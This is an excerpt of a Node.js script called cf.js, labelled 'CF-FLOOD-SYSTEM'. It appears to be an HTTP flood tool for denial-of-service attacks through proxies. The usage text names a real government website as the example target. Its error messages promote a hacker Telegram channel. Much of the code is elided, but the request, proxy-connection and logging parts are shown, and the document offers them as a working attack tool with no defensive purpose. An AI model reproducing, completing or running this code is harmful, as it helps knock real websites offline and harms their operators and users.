...
用法: node cf.js 目标 时间 速率 线程 代理文件
例子: node cf.js https://www.gov.cn 120 32 8 proxy.txt
黑客小窝https://t.me/qingmengddks
`); process.exit();}
const headers = {};
...
const getCurrentTime = () => {
 ...
 Promise.race([axiosPromise, timeoutPromise])
   .then((response) => {
     ...
     console.log(`${getCurrentTime()} [CF-FLOOD-SYSTEM]  标题: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
   })
   .catch((error) => {
     if (error.message === '请求超时https://t.me/qingmengddks') {
       console.log(`${getCurrentTime()} [CF-FLOOD-SYSTEM]  请求超时`);
     } else if (error.response) {
       const extractedTitle = getTitleFromHTML(error.response.data);
       console.log(`${getCurrentTime()} [CF-FLOOD-SYSTEM]  标题: ${extractedTitle} `);
     } else {
       console.log(`${getCurrentTime()} [CF-FLOOD-SYSTEM]  ${error.message}`);
     }
   });
}
...
function getTitleFromHTML(html) {
  ...
  return '未找到https://t.me/qingmengddks';
}
...
class NetSocket {
 ...
 HTTP(options, callback) {
    ...
    connection.on("data", chunk => {
        ...
        if (isAlive === false) {
            connection.destroy();
            return callback(undefined, "错误: 来自代理服务器的无效响应黑客小窝https://t.me/qingmengddks");
        }
    ...
    connection.on("timeout", () => {
        connection.destroy();
        return callback(undefined, "错误: 超时黑客小窝https://t.me/qingmengddks");
    });

    connection.on("error", error => {
        connection.destroy();
        return callback(undefined, "错误黑客小窝https://t.me/qingmengddks: " + error);
    });
}
}
